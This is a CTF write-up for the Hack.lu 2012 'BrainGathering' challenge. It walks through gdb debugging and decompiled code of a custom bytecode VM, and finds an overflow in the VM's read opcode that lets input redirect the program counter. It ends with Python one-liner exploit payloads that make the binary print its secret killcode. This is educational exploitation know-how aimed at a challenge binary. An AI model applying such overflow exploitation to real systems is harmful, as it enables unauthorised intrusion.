---
title: '[writeup] Hacklu 2012 – Challenge #6 – BrainGathering – (500)'
author: suto
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:0:{}'
tweetbackscheck:
  - 1408358963
kopa_newsmixlight_total_view:
  - 1
category: ctf - clgt crew
tags:
  - '2012'
  - CTF
  - Hacklu
---
I did not solve this during CTF and my mistake is not using IDA to decompile since it has some obfuscate.  
After CTF end, i use gdb to dump running process to binary file and  
analyze it again, try to finish it.

> gdb &#8211;pid [PID]  
> gdb>info proc  
> process 4660
> 
> gdb>shell cat /proc/4660/maps  
> 08048000-0804a000 rwxp 00000000 08:03 7213513
> 
> gdb>dump out.dmp 0&#215;08048000 0x0804a000

Load it to IDA and decompile. Basically it will loop and get an OPCODE  
from static array locate at address 0x804B060, and a action defined  
by that OPCODE will be run.

Just thinking a bit, when we input 0&#215;36 bytes it will end up with a message:

> ==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==  
> Automated system for braingathering ready.
> 
> 1) Need Brainz brainz brainz, Zombie huuuungry!  
> 2) How much longer till braaaiiiiinz?  
> 3) Nooo more brainz! STOP THE BRAINZ!
> 
> X) Nah, I&#8217;m going to get my brains somewhere else.
> 
> 3  
> \### Warning: Only for authorized zombies ###  
> Please enter teh z0mb13 k1llc0d3:  
> BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  
> XPLOIT DETECTED, ALTERING KILLCODE

In normal case when our string < 0&#215;36 bytes length:

> ==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==  
> Automated system for braingathering ready.
> 
> 1) Need Brainz brainz brainz, Zombie huuuungry!  
> 2) How much longer till braaaiiiiinz?  
> 3) Nooo more brainz! STOP THE BRAINZ!
> 
> X) Nah, I&#8217;m going to get my brains somewhere else.
> 
> 3  
> \### Warning: Only for authorized zombies ###  
> Please enter teh z0mb13 k1llc0d3:  
> hello  
> Comparing k1llc0d3  
> INVALID
> 
> ==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==  
> Automated system for braingathering ready

It continue. So i think it must be a different when this vm handle  
our string. The execution flow will different in 2 cases. Let find out:

I set a breakpoint and print at 0x0804865B where it get OPCODE and put it  
in to EAX register.

> b *0x0804865B  
> commands 1  
> p/x $ebx  
> p/x $eax  
> continue  
> end

Compare 2 results I have found where the execution alter:

First one is &#8220;B&#8221;*0&#215;36:

> 0x081ea147 71  
> 0x081ea148 82  
> 0x081ea149 14  
> 0x081ea14a 53  
> 0x081ea14d 81  
> 0x081ea14e 40  
> 0x081ea150 74  
> 0x081ea151 41  
> 0x081ea152 86  
> 0x081ea153 68  
> 0x081ea154 74  
> 0x081ea155 58  
> 0x081ea4f3 3d  
> 0x081ea4f6 81  
> 0x081ea4f7 3f  
> 0x081ea4f9 53  
> 0x081ea4fc 28

In normal case:

> 0&#215;08515147 71  
> 0&#215;08515148 82  
> 0&#215;08515149 14  
> 0x0851514a 53  
> 0x0851514d 81  
> 0x0851514e 40  
> 0&#215;08515150 74  
> 0&#215;08515151 41  
> 0&#215;08515152 86  
> 0&#215;08515153 68  
> 0&#215;08515154 74  
> 0&#215;08515155 58  
> 0x0851531d 58  
> 0&#215;08519149 53  
> 0x0851914c 53  
> 0x0851914f 53  
> 0&#215;08519152 53

The address in 2 case will same at offset, so we can compare easy.  
It start different when handle OPCODE 0&#215;58.

> case 0&#215;58:  
> v22 = *heap1_end2;  
> ++heap1_end2;  
> PC += v22;  
> continue;

So v22 will change flow of execution because. I want to know why this happen:

> gdb>b *0x080487DE  
> gdb>commands 2  
> >p/x $ebx  
> >continue  
> >end

And i end up with

> &#8230;  
> ..  
> Breakpoint 2, 0x080487de in close@plt ()  
> $12 = 0&#215;4242

Yeah, so we can control v22. Let look into hex-rays source to see why this happen:

In OPCODE 0x3F

> case 0x3F:  
> v40 = *PC++;  
> v41 = v4;  
> READ(v40, &PC[v61], 0xFFFF &#8211; (unsigned _\_int16)((\_WORD)heap1\_end2 &#8211; (\_WORD)PC));  
> v4 = v41;  
> continue;

It will read our string to PC[v61] with a size result from calculation: 0xFFFF &#8211; (unsigned _\_int16)((\_WORD)heap1\_end2 &#8211; (\_WORD)PC)  
Since result from v22 we can understand an overflow occur, last 2 bytes of our string overwrite value at heap1_end2.  
When OPCODE 0&#215;58 is processed, PC will increase base on that 2 bytes.

Now the time for exploitation, first we need to calculate offset beetween PC at that time and our string.

> gdb>b *0x080487DE if $ebx=0&#215;4242  
> gdb>c  
> &#8230;..  
> gdb>x/20wx $edi-0&#215;40  
> 0x8343fb5: 0&#215;00000000 0&#215;00000000 0&#215;00000000 0&#215;00000000  
> 0x8343fc5: 0x700e4242 0&#215;00007010 0&#215;00000000 0&#215;42424242  
> 0x8343fd5: 0&#215;42424242 0&#215;42424242 0&#215;42424242 0&#215;42424242  
> 0x8343fe5: 0&#215;42424242 0&#215;00104242 0x7000ffc9 0x01e38010  
> 0x8343ff5: 0&#215;42424242 0&#215;42424242 0&#215;42424242 0&#215;42424242  
> gdb> x/x $esp+0x2c  
> 0xffe8648c: 0&#215;08334008  
> gdb> p/x 0x8343fd5-0&#215;08334008  
> $5 = 0xffcd

So just to confirm i&#8217;ll return to 0&#215;40 ( write OPCODE) :

> python -c &#8216;print &#8220;3&#8243;\*34+&#8221;x40&#8243;\*41+&#8221;xffxcd&#8221;*7&#8242; > file

And:

> ./braingathering < file  
> ==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==  
> Automated system for braingathering ready.
> 
> 1) Need Brainz brainz brainz, Zombie huuuungry!  
> 2) How much longer till braaaiiiiinz?  
> 3) Nooo more brainz! STOP THE BRAINZ!
> 
> X) Nah, I&#8217;m going to get my brains somewhere else.
> 
> \### Warning: Only for authorized zombies ###  
> Please enter teh z0mb13 k1llc0d3:  
> Comparing k1llc0d3  
> INVALID
> 
> INVALID  
> INVALID  
> INVALID  
> INVALID  
> INVALID  
> INVALID  
> zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz

And make sure index of byte we can start our shellcode:

> python -c &#8216;print &#8220;3&#8243;\*34+&#8221;A&#8221;\*6+&#8221;x40&#8243;+&#8221;B&#8221;\*34+&#8221;xffxcd&#8221;\*7&#8242; > file  
> ./braingathering < file  
> Comparing k1llc0d3  
> INVALID
> 
> INVALID

In OPCODE 0&#215;40:

> case 0&#215;40:  
> v36 = *PC++;  
> v37 = 2;  
> v63 = v4;  
> if ( v36 <= 1u )  
> v37 = v36;  
> v38 = v37;  
> len = STRLEN(&PC[v61]);  
> WRITE(v38, &PC[v61], len);  
> v4 = v63;  
> continue;

Finally. We findout where content of killcode existence in memory.  
Let find where it is:

> gdb-peda$ searchmem KILLCODE heap  
> Searching for &#8216;KILLCODE&#8217; in: heap ranges  
> Found 1 results, display max 1 items:  
> [heap] : 0x838b008 (&#8220;KILLCODEn## Warn&#8221;)  
> gdb-peda$ p/x 0x838b008-0&#215;08383008  
> $1 = 0&#215;8000

And we need to reset v61 to 0&#215;8000 We use OPCODE 0&#215;49

> case 0&#215;49:  
> v29 = PC[1];  
> v30 = *PC;  
> PC += 2;  
> v61 = (v29 << 8) | v30;  
> continue;

And final exploit ( so lucky since v61 has value 0 at that time)

> $echo &#8220;FUKCING KILLCODE&#8221; > killcode
> 
> $python -c &#8216;print &#8220;3&#8243;\*34+&#8221;A&#8221;\*6+&#8221;x49x00x80x40&#8243;+&#8221;B&#8221;\*31+&#8221;xffxcd&#8221;\*7&#8242; > file  
> ./braingathering < file  
> ==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==  
> Automated system for braingathering ready.
> 
> 1) Need Brainz brainz brainz, Zombie huuuungry!  
> 2) How much longer till braaaiiiiinz?  
> 3) Nooo more brainz! STOP THE BRAINZ!
> 
> X) Nah, I&#8217;m going to get my brains somewhere else.
> 
> \### Warning: Only for authorized zombies ###  
> Please enter teh z0mb13 k1llc0d3:  
> Comparing k1llc0d3  
> INVALID
> 
> FUKCING KILLCODE

and hex-rays source:

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_80485E0()
{
  BYTE *PC; // esi@1 MAPDST
  int index; // eax@1
  _WORD *heap1_end2; // edi@3
  int v4; // edx@3
  char opCode; // al@4
  int v6; // ST3C_4@5
  unsigned __int16 v7; // ax@6
  int v8; // eax@11
  int v9; // esi@12
  __int16 v10; // si@15
  __int16 v11; // ax@15
  char v12; // si@16
  int v13; // ecx@16
  unsigned __int16 v14; // cx@19
  char v15; // si@23
  int v16; // eax@23
  unsigned __int16 v17; // si@26
  __int16 v18; // si@27
  __int16 v19; // ax@27
  char v20; // si@30
  int v21; // eax@30
  int v22; // ebx@33
  __int16 v23; // si@36
  __int16 v24; // ax@36
  __int16 v25; // si@37
  __int16 v26; // ax@37
  __int16 v27; // si@38
  __int16 v28; // cx@38
  __int16 v29; // ax@39
  __int16 v30; // cx@39
  __int16 v31; // si@45
  __int16 v32; // ax@45
  int v33; // ST3C_4@47
  int v34; // ST3C_4@48
  unsigned __int16 v35; // ax@48
  unsigned __int16 v36; // si@50
  signed int v37; // eax@50
  signed int v38; // ST40_4@52
  int len; // eax@52
  unsigned __int16 v40; // si@53
  int v41; // ST3C_4@53
  __int16 v42; // si@54
  unsigned __int16 v43; // ax@54
  __int16 v44; // si@55
  __int16 v45; // ax@55
  __int16 v46; // si@57
  __int16 v47; // ax@57
  BYTE v48; // si@59
  int v49; // ecx@59
  int v50; // eax@63
  __int16 v51; // si@67
  unsigned __int16 v52; // ax@67
  BYTE v53; // si@77
  int v54; // ecx@77
  __int16 v55; // si@80
  __int16 v56; // ax@80
  char v57; // si@82
  int v58; // eax@82
  int v59; // eax@85
  unsigned __int16 v61; // [sp+1Eh] [bp-42h]@3
  int v63; // [sp+3Ch] [bp-24h]@50
  BYTE *heap1_end1; // [sp+44h] [bp-1Ch]@3
  unsigned __int16 v65; // [sp+48h] [bp-18h]@3
  unsigned __int16 v66; // [sp+4Ah] [bp-16h]@3

  PC = (BYTE *)malloc_(65535);
  memset_((int)PC, 0, 65535);
  index = 0;
  do
  {
    PC[index] = byte_804B060[index];
    ++index;
  }
  while ( index != 2068 );
  heap1_end1 = PC + 65535;
  heap1_end2 = PC + 65535;
  v4 = 0;
  v65 = 0;
  v66 = 0;
  v61 = 0;
  while ( 1 )
  {
    opCode = *PC++;
    switch ( opCode )
    {
      default:
        continue;
      case 0x90:
        v6 = v4;
        sleep_();
        v4 = v6;
        continue;
      case 0x86:
        v7 = *heap1_end2;
        ++heap1_end2;
        v65 = v7;
        continue;
      case 0x82:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = v65;
        continue;
      case 0x81:
        v61 = (_WORD)heap1_end2 - (_WORD)PC;
        continue;
      case 0x7B:
        v8 = v4 & 0x1FFF;
        if ( v66 == v65 )
        {
          v4 &= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v65 = v66;
        }
        else
        {
          HIWORD(v9) = HIWORD(v4);
          LOWORD(v4) = v8 | 0x8000;
          if ( v66 &gt;= v65 )
          {
            LOWORD(v9) = v8 | 0x4000;
            v4 = v9;
          }
        }
        continue;
      case 0x79:
        v10 = PC[1];
        v11 = *PC;
        PC += 2;
        v65 -= (v10 &lt;&lt; 8) | v11;
        continue;
      case 0x75:
        v12 = *PC++;
        v13 = v4 | 0x8000;
        LOWORD(v4) = v4 & 0x7FFF;
        if ( v12 )
          v4 = v13;
        continue;
      case 0x74:
        v14 = *heap1_end2;
        ++heap1_end2;
        v61 = v14;
        continue;
      case 0x71:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = v66;
        continue;
      case 0x69:
        v15 = *PC++;
        v16 = v4 | 0x40;
        v4 &= 0xFFFFFFBFu;
        if ( v15 )
          v4 = v16;
        continue;
      case 0x68:
        v17 = *heap1_end2;
        ++heap1_end2;
        v66 = v17;
        continue;
      case 0x66:
        v18 = PC[1];
        v19 = *PC;
        PC += 2;
        v66 = (v18 &lt;&lt; 8) | v19;
        continue;
      case 0x61:
        v61 ^= (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
        goto LABEL_29;
      case 0x5C:
        v20 = *PC++;
        v21 = v4 | 0x20;
        v4 &= 0xFFFFFFDFu;
        if ( v20 )
          v4 = v21;
        continue;
      case 0x58:
        v22 = *heap1_end2;
        ++heap1_end2;
        PC += v22;
        continue;
      case 0x53:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        v23 = PC[1];
        --heap1_end2;
        v24 = *PC;
        PC += 2;
        *heap1_end2 = (v23 &lt;&lt; 8) | v24;
        continue;
      case 0x4F:
        v25 = PC[1];
        v26 = *PC;
        PC += 2;
        v61 += (v25 &lt;&lt; 8) | v26;
        continue;
      case 0x4B:
        v27 = PC[1];
        v28 = *PC;
        PC += 2;
        v65 = (v27 &lt;&lt; 8) | v28;
        continue;
      case 0x49:
        v29 = PC[1];
        v30 = *PC;
        PC += 2;
        v61 = (v29 &lt;&lt; 8) | v30;
        continue;
      case 0x47:
        if ( (v4 & 0x2010) == 8208 || v4 & 0x40 && (unsigned __int16)v4 &gt;&gt; 15 || (v4 & 0x4020) == 16416 )
          PC += *PC | (PC[1] &lt;&lt; 8);
        else
LABEL_29:
          PC += 2;
        continue;
      case 0x45:
        v31 = PC[1];
        v32 = *PC;
        PC += 2;
        v65 += (v31 &lt;&lt; 8) | v32;
        continue;
      case 0x43:
        if ( v61 &gt; 2u )
        {
          v33 = v4;
          close_(v61);
          v4 = v33;
        }
        continue;
      case 0x42:
        v34 = v4;
        v35 = OPEN(&PC[v61], 0);
        v4 = v34;
        v61 = v35;
        continue;
      case 0x41:
        v4 = *heap1_end2;
        ++heap1_end2;
        continue;
      case 0x40:
        v36 = *PC++;
        v37 = 2;
        v63 = v4;
        if ( v36 &lt;= 1u )
          v37 = v36;
        v38 = v37;
        len = STRLEN(&PC[v61]);
        WRITE(v38, &PC[v61], len);
        v4 = v63;
        continue;
      case 0x3F:
        v40 = *PC++;
        v41 = v4;
        READ(v40, &PC[v61], 0xFFFF - (unsigned __int16)((_WORD)heap1_end2 - (_WORD)PC));
        v4 = v41;
        continue;
      case 0x3D:
        v42 = PC[1];
        v43 = *PC;
        PC += 2;
        heap1_end2 = (char *)heap1_end2 - ((unsigned __int16)(v42 &lt;&lt; 8) | v43);
        continue;
      case 0x3A:
        v44 = PC[1];
        v45 = *PC;
        PC += 2;
        v61 -= (v44 &lt;&lt; 8) | v45;
        continue;
      case 0x39:
        v61 += v66;
        continue;
      case 0x36:
        v46 = PC[1];
        v47 = *PC;
        PC += 2;
        v66 += (v46 &lt;&lt; 8) | v47;
        continue;
      case 0x33:
        v66 = (_WORD)heap1_end2 - (_WORD)PC;
        continue;
      case 0x31:
        v48 = *PC;
        v49 = v4;
        ++PC;
        BYTE1(v49) |= 0x20u;
        BYTE1(v4) &= 0xDFu;
        if ( v48 )
          v4 = v49;
        continue;
      case 0x30:
        *(_WORD *)&PC[v61] = v66;
        continue;
      case 0x2C:
        v50 = v4 & 0x1FFF;
        if ( v61 == v65 )
        {
          v4 &= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v65 = v61;
        }
        else
        {
          LOWORD(v4) = v50 | 0x8000;
          BYTE1(v50) |= 0x40u;
          if ( v61 &gt;= v65 )
            v4 = v50;
        }
        continue;
      case 0x28:
        v51 = PC[1];
        v52 = *PC;
        PC += 2;
        heap1_end2 = (char *)heap1_end2 + ((unsigned __int16)(v51 &lt;&lt; 8) | v52);
        continue;
      case 0x27:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = (_WORD)PC + 2 - (_WORD)PC;
        PC += (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
        break;
      case 0x25:
        v61 -= v66;
        break;
      case 0x24:
        v65 = (_WORD)heap1_end2 - (_WORD)PC;
        break;
      case 0x21:
        v61 = *(_WORD *)&PC[v66];
        break;
      case 0x20:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
        {
terminate_:
          put_("VM PROTECTION FAIL, TERMINATING");
          exit_(1);
        }
        --heap1_end2;
        *heap1_end2 = v61;
        break;
      case 0x17:
        v53 = *PC;
        v54 = v4;
        ++PC;
        BYTE1(v54) |= 0x40u;
        BYTE1(v4) &= 0xBFu;
        if ( v53 )
          v4 = v54;
        break;
      case 0x16:
        v55 = PC[1];
        v56 = *PC;
        PC += 2;
        v66 -= (v55 &lt;&lt; 8) | v56;
        break;
      case 0x14:
        --heap1_end2;
        *heap1_end2 = v4;
        break;
      case 0xD:
        v57 = *PC++;
        v58 = v4 | 0x10;
        v4 &= 0xFFFFFFEFu;
        if ( v57 )
          v4 = v58;
        break;
      case 0xA:
        v59 = v4 & 0x1FFF;
        if ( v61 == v66 )
        {
          v4 &= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v66 = v61;
        }
        else
        {
          v4 &= 0x1FFFu;
          BYTE1(v59) |= 0x40u;
          LOWORD(v4) = v4 | 0x8000;
          if ( v66 &lt;= v61 )
            v4 = v59;
        }
        break;
      case 0xFF:
        return 0;
    }
  }
}
</pre>